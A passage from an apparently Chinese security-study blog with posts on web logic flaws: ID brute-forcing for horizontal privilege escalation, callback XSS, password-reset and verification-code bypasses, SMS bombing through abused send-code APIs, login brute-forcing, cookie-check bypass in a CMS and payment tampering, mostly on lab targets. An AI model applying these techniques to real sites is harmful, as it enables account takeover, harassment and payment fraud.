rel="noopener" href="http://www.grasp.com.cn/DownFiles.aspx?id=%EF%BC%8C%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85">http://www.grasp.com.cn/DownFiles.aspx?id=，抓取数据包</a></h3><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image34.png" alt="image34"></p><h3 id="2-发送intrude"><a href="#2-发送intrude" class="headerlink" title="2.发送intrude"></a>2.发送intrude</h3><p>设置变量</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image35.png" alt="image35"></p><p>数值型爆破</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image36.png" alt="image36"></p><p>攻击</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image37.png" alt="image37"></p><p><strong>用法：</strong>测试水平越权，将id或其他值从1-1000爆破，尝试能不能获取到其他编号的用户信息。</p><h2 id="六-Callback自定义返回调用安全——实例（接口安全）"><a href="#六-Callback自定义返回调用安全——实例（接口安全）" class="headerlink" title="六.Callback自定义返回调用安全——实例（接口安全）"></a>六.Callback自定义返回调用安全——实例（接口安全）</h2><h3 id="1-什么是callback"><a href="#1-什么是callback" class="headerlink" title="1.什么是callback"></a>1.什么是callback</h3><p>一般而言，函数的形参是指由外往内向函数体传递变量的入口，但此处加了callback后则完全相反，它是指函数体在完成某种使命后调用外部函数的出口！这时候应该明白什么叫”回调”了吧，也就是回头调用外部函数的意思。</p><h3 id="2-回调url分析"><a href="#2-回调url分析" class="headerlink" title="2.回调url分析"></a>2.回调url分析</h3><p>url:<a target="_blank" rel="noopener" href="https://2haohr.com/login?callback=https://2haohr.com/personnel">https://2haohr.com/login?callback=https%3A%2F%2F2haohr.com%2Fpersonnel</a></p><ul><li>首先：https%3A%2F%2F2haohr.com%2Fpersonnel是微信登录，然后将微信登录的结果返回网站的callback参数</li><li>其次：callback的参数可以修改，因此这里和跨站漏洞有关系</li><li>在网页源代码搜索传递的参数，如果存在，意味着URL传递的参数会在网页的前端回显，那么，也意味着可以构造XSS漏洞（测试有没有过滤，完不完整）</li></ul><h3 id="3-上述在实战中如何做到漏洞发现-bp-功能点"><a href="#3-上述在实战中如何做到漏洞发现-bp-功能点" class="headerlink" title="3.上述在实战中如何做到漏洞发现-bp 功能点"></a>3.上述在实战中如何做到漏洞发现-bp 功能点</h3><p><strong>原理：</strong>逻辑漏洞挖功能点和参数值（关键的参数：id，callback，filename，uid等等）</p><p>这里用pikachu靶场尝试</p><p>抓取发送到爬虫，爬取结果</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image38.png" alt="image38"></p><p>然后从爬取的结果中去搜索一些可疑的关键字，如id、uid等</p><p><img src="/2022/03/23/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81-token-%E6%8E%A5%E5%8F%A3/逻辑越权之验证码-token-接口/image39.png" alt="image39"></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">逻辑越权之找回机制接口安全</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-13 14:22:01" itemprop="dateCreated datePublished" datetime="2022-03-13T14:22:01+08:00">2022-03-13</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-30 14:17:43" itemprop="dateModified" datetime="2022-03-30T14:17:43+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.2k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>1 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="逻辑越权之找回机制接口安全"><a href="#逻辑越权之找回机制接口安全" class="headerlink" title="逻辑越权之找回机制接口安全"></a>逻辑越权之找回机制接口安全</h1><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image1.webp" alt="image1"></p><h2 id="一-原理分析"><a href="#一-原理分析" class="headerlink" title="一.原理分析"></a>一.原理分析</h2><h3 id="1-找回重置机制"><a href="#1-找回重置机制" class="headerlink" title="1.找回重置机制"></a>1.找回重置机制</h3><ul><li>通过验证码确定你是不是找回账号的主人，可能出现逻辑问题</li><li>客户端回显（验证码在客户端或者浏览器里面可以看到）</li><li>Response 状态值（有回复的状态值如0/1，我们可以更改状态值来实现绕过）</li><li>验证码爆破（验证码是简单的数字码，而且验证码短时间不会改变（验证码有生效时间）（验证码有输入次数限制））</li><li>找回流程绕过（找回成功后会跳转到另外一个页面，先通过一个正常用户去获取跳转的URL和数据包，再换一个用户去访问第三部（跳过验证））</li></ul><h3 id="2-接口调用乱用"><a href="#2-接口调用乱用" class="headerlink" title="2.接口调用乱用"></a>2.接口调用乱用</h3><p>短信轰炸，来电轰炸等（有些网站有发送数据包的功能，截获网站验证码的数据包，然后利用软件或者程序去进行批量测试，即调用别人网站的接口来实现短信轰炸）。</p><h2 id="二-墨者靶场密码重置-验证码套用-靶场"><a href="#二-墨者靶场密码重置-验证码套用-靶场" class="headerlink" title="二.墨者靶场密码重置-验证码套用-靶场"></a>二.墨者靶场密码重置-验证码套用-靶场</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></p><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image2.png" alt="image2"></p><h3 id="2-先输入已经注册的手机号获取验证码（正确的验证码）"><a href="#2-先输入已经注册的手机号获取验证码（正确的验证码）" class="headerlink" title="2.先输入已经注册的手机号获取验证码（正确的验证码）"></a>2.先输入已经注册的手机号获取验证码（正确的验证码）</h3><h3 id="3-收到验证码后再把手机号修改成目标手机号，提交后得到flag"><a href="#3-收到验证码后再把手机号修改成目标手机号，提交后得到flag" class="headerlink" title="3.收到验证码后再把手机号修改成目标手机号，提交后得到flag"></a>3.收到验证码后再把手机号修改成目标手机号，提交后得到flag</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image3.png" alt="image3"></p><h3 id="4-原理分析"><a href="#4-原理分析" class="headerlink" title="4.原理分析"></a>4.原理分析</h3><p>未验证短信验证码与手机的匹配关系（却验证了短信验证码与图片验证码）。 —服务器端应该是只检查是否发送过验证码，但未验证验证码与手机号的匹配关系，导致任意账号重置。</p><h2 id="三-手机邮箱验证码逻辑-客户端回显-实例"><a href="#三-手机邮箱验证码逻辑-客户端回显-实例" class="headerlink" title="三.手机邮箱验证码逻辑-客户端回显-实例"></a>三.手机邮箱验证码逻辑-客户端回显-实例</h2><h3 id="1-进入靶场-1"><a href="#1-进入靶场-1" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p>靶场地址：<a target="_blank" rel="noopener" href="http://www.0712zpw.com/">http://www.0712zpw.com</a></p><h3 id="2-邮箱验证"><a href="#2-邮箱验证" class="headerlink" title="2.邮箱验证"></a>2.邮箱验证</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image4.png" alt="image4"></p><h3 id="3-抓包分析（这里可以直接看到验证码，也就是说不用邮件查看也知道验证码）"><a href="#3-抓包分析（这里可以直接看到验证码，也就是说不用邮件查看也知道验证码）" class="headerlink" title="3.抓包分析（这里可以直接看到验证码，也就是说不用邮件查看也知道验证码）"></a>3.抓包分析（这里可以直接看到验证码，也就是说不用邮件查看也知道验证码）</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image5.png" alt="image5"></p><h3 id="4-查看真实验证码（真实验证码与抓包获取的验证码不同，母鸡了）"><a href="#4-查看真实验证码（真实验证码与抓包获取的验证码不同，母鸡了）" class="headerlink" title="4.查看真实验证码（真实验证码与抓包获取的验证码不同，母鸡了）"></a>4.查看真实验证码（真实验证码与抓包获取的验证码不同，母鸡了）</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image6.png" alt="image6"></p><h2 id="四-人力云靶场"><a href="#四-人力云靶场" class="headerlink" title="四.人力云靶场"></a>四.人力云靶场</h2><h3 id="1-进入靶场-2"><a href="#1-进入靶场-2" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p>靶场地址：<a target="_blank" rel="noopener" href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a></p><h3 id="2-注册账号后，进入账号绑定（手机绑定）"><a href="#2-注册账号后，进入账号绑定（手机绑定）" class="headerlink" title="2.注册账号后，进入账号绑定（手机绑定）"></a>2.注册账号后，进入账号绑定（手机绑定）</h3><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image7.png" alt="image7"></p><p>输入手机号，并发送验证码，抓包</p><p>明显这里的验证码是我们自己随便输的</p><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image8.png" alt="image8"></p><p>抓取该数据包的回显</p><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image9.png" alt="image9"></p><p>放出该数据包后收到回显数据包（状态码为3）</p><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image10.png" alt="image10"></p><p>将状态码修改为1（实战情况下正确的回显不一定是数字，还可能是一段字符串，可以用自己的手机号来测试正确的状态码）</p><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image11.png" alt="image11"></p><p>显示手机绑定成功</p><p><img src="/2022/03/13/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/image12.png" alt="image12"></p><p>但是刷新之后绑定的手机号又消失了，估计此处还是以后台数据为主吧。</p><h2 id="五-绑定手机验证码逻辑-Rep-状态值篡改-实例"><a href="#五-绑定手机验证码逻辑-Rep-状态值篡改-实例" class="headerlink" title="五.绑定手机验证码逻辑-Rep 状态值篡改-实例"></a>五.绑定手机验证码逻辑-Rep 状态值篡改-实例</h2><p>app没找到，没法演示</p><h2 id="六-找回密码验证码逻辑-爆破测试-实例"><a href="#六-找回密码验证码逻辑-爆破测试-实例" class="headerlink" title="六.找回密码验证码逻辑-爆破测试-实例"></a>六.找回密码验证码逻辑-爆破测试-实例</h2><p>PHP云平台爆破（原理分析）：</p><ul><li><p>抓取数据包，将code发送爆破（如果是数字，就可以直接爆破，如果是英文，就要用字典）</p></li><li><p>前提条件：1.验证码的存活时间2.验证码的输入次数限制3.有些短信验证码输入一次就改一次（就没法爆破）</p></li><li><p>如果是直接显示的图片验证码（这里要识别验证码（插件自动识别））（如果是拖动或者识别的验证码就更加复杂</p></li></ul><h2 id="七-某-APP-短信轰炸接口乱用-实例接口调用发包"><a href="#七-某-APP-短信轰炸接口乱用-实例接口调用发包" class="headerlink" title="七.某 APP 短信轰炸接口乱用-实例接口调用发包"></a>七.某 APP 短信轰炸接口乱用-实例接口调用发包</h2><ul><li><p>网站注册等等会有验证码，就有一个专门发验证码的接口</p></li><li><p>恶意的将这些网站的接口收集到一起，用程序批量的循环发送</p></li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/" class="post-title-link" itemprop="url">逻辑越权之登录脆弱支付篡改</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-03-11 20:44:05" itemprop="dateCreated datePublished" datetime="2022-03-11T20:44:05+08:00">2022-03-11</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-30 14:15:42" itemprop="dateModified" datetime="2022-03-30T14:15:42+08:00">2022-03-30</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>2.2k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="逻辑越权之登录脆弱支付篡改"><a href="#逻辑越权之登录脆弱支付篡改" class="headerlink" title="逻辑越权之登录脆弱支付篡改"></a>逻辑越权之登录脆弱支付篡改</h1><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image1.webp" alt="image1"></p><h2 id="一-登陆应用功能点安全问题"><a href="#一-登陆应用功能点安全问题" class="headerlink" title="一.登陆应用功能点安全问题"></a>一.登陆应用功能点安全问题</h2><p>检测功能点，检测，危害，修复方案等。</p><ul><li>登陆点暴力破解</li><li>HTTP/HTTPS传输Cookie脆弱点验证</li><li>Session固定点测试</li><li>验证密文比对安全测试</li></ul><h2 id="二-http-https协议密文抓取"><a href="#二-http-https协议密文抓取" class="headerlink" title="二.http/https协议密文抓取"></a>二.http/https协议密文抓取</h2><h3 id="1-http和https区别"><a href="#1-http和https区别" class="headerlink" title="1.http和https区别"></a>1.http和https区别</h3><p>http数据包可能加密，也可能不加密（火狐浏览器好像看不到post提交的内容）。</p><p>http和https网站的区别在url上，数据包貌似都是http/1.1</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image2.png" alt="image2"></p><p>https的数据包提交的数据会加密（区分的原因：如果没有加密也就是http协议，可以直接爆破，而https协议提交的数据加密了，不能简单的爆破）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image3.png" alt="image3"></p><h3 id="2-登录zblog"><a href="#2-登录zblog" class="headerlink" title="2.登录zblog"></a>2.登录zblog</h3><p>靶场下载地址：<a target="_blank" rel="noopener" href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></p><p>登录（zym，***）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image4.png" alt="image4"></p><p>抓包分析（发现密码加密了，在爆破的时候要将密文加密再爆破）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image5.png" alt="image5"></p><p>采用抓包工具爆破密码设置密码为变量</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image6.png" alt="image6"></p><p>自己写个字典</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image7.png" alt="image7"></p><p>载入字典</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image8.png" alt="image8"></p><p>加密（密码一般为MD5哈希）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image9.png" alt="image9"></p><p>返回302说明有跳转，爆破成功！</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image10.png" alt="image10"></p><p>拿对应的payload去MD5解码（未解码成功）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image11.png" alt="image11"></p><p>但第五个payload对应的值是对应的密码</p><h2 id="三-Cookie脆弱点验证修改测试"><a href="#三-Cookie脆弱点验证修改测试" class="headerlink" title="三.Cookie脆弱点验证修改测试"></a>三.Cookie脆弱点验证修改测试</h2><h3 id="1-进入靶场，尝试登录"><a href="#1-进入靶场，尝试登录" class="headerlink" title="1.进入靶场，尝试登录"></a>1.进入靶场，尝试登录</h3><p>注意这里的登陆路径传参，可能包含漏洞，参数为login</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image12.png" alt="image12"></p><p>输入正确密码（zym，root）后跳转页面，参数为index</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image13.png" alt="image13"></p><p>抓包分析一下，这里post提交的数据没有加密</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image14.png" alt="image14"></p><h3 id="2-分析源代码"><a href="#2-分析源代码" class="headerlink" title="2.分析源代码"></a>2.分析源代码</h3><p>这里index传参r，判断传递的参数file是为空还是为index，如果是index，就执行file文件下的传递参数的文件。这里只有等于index路径才能跳转。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image15.png" alt="image15"></p><p>如果r=index，在跳转管理员执行/files/index.php文件，文件靠头包含了验证，防止用户直接登录url路径进入管理员后台。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image16.png" alt="image16"></p><p>查看登录验证，判断用户的cookie，如果为空就跳转到登录界面。（漏洞产生：只要cookie有数据就可以访问）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image17.png" alt="image17"></p><h3 id="3-修改cookie登录"><a href="#3-修改cookie登录" class="headerlink" title="3.修改cookie登录"></a>3.修改cookie登录</h3><p>cookie修改，只要不为空就行（需要访问192.168.176.128:10086/poor_cookie/admin/?r=index）</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image18.png" alt="image18"></p><p>发现登陆成功，而且用户这里没有显示admin，而是空。</p><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image26.png" alt="image26"></p><h3 id="4-实战条件下如何去分析漏洞"><a href="#4-实战条件下如何去分析漏洞" class="headerlink" title="4.实战条件下如何去分析漏洞"></a>4.实战条件下如何去分析漏洞</h3><ul><li><p>没有源码，去找cookie脆弱点十分困难的</p></li><li><p>如果有特殊值，如user=admin，可以尝试修改，看是不是可以登录到其它用户，如user=text</p></li><li><p>可以根据这个漏洞，去搜索采用熊海CMS的网站是否存在cookie脆弱的漏洞</p></li></ul><p><img src="/2022/03/11/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E7%99%BB%E5%BD%95%E8%84%86%E5%BC%B1%E6%94%AF%E4%BB%98%E7%AF%A1%E6%94%B9/image19.png" alt="image19"></p><h2 id="四-数据纂改安全问题"><a href="#四-数据纂改安全问题" class="headerlink" title="四.数据纂改安全问题"></a>四.数据纂改安全问题</h2><h3 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1.漏洞"></a>1.漏洞</h3><ul><li>修改支付价格</li><li>修改支付状态</li><li>修改购买数量</li><li>修改附属值</li><li>修改支付接口</li><li>多重替换支付</li><li>重复支付</li><li>最小额支付</li><li>值为最大值支付问题</li><li>越权支付</li><li>无限制适用</li><li>修改优惠价格</li></ul><p>之所以列出这些漏洞，其实不是存在一个，而是网站的设计者很难从这么多方面去考虑支付问题，从而可以发现漏洞 。</p><p><strong>商品购买流程：</strong>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p><p><strong>常见篡改参数：</strong>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p><p><strong>常见修改方法：</strong>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p><h3 id="2-尝试用订单a的价格来支付订单b"><a href="#2-尝试用订单a的价格来支付订单b" class="headerlink" title="2.尝试用订单a的价格来支付订单b"></a>2.尝试用订单a的价格来支付订单b</h3><p>靶场地址：niushop</p><p>点击购买</p><p><img 